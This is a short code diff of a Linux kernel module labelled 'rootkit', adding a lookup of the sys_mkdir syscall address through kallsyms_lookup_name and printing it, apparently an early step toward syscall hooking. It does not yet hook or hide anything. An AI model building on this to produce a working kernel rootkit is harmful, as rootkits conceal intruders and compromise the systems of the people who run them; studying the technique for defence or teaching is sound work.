@@ -1,10 +1,17 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
+#include <stdint.h>
+
+uint64_t target_addr;
 
 int init_rootkit(void)
 {
     printk("[rootkit] - Hello\n");
+
+    target_addr = kallsyms_lookup_name(SYSCALL_NAME("sys_mkdir"));
+    printk("[rootkit] - target_addr = 0x%llX", target_addr);
+
     return 0;
 }
 
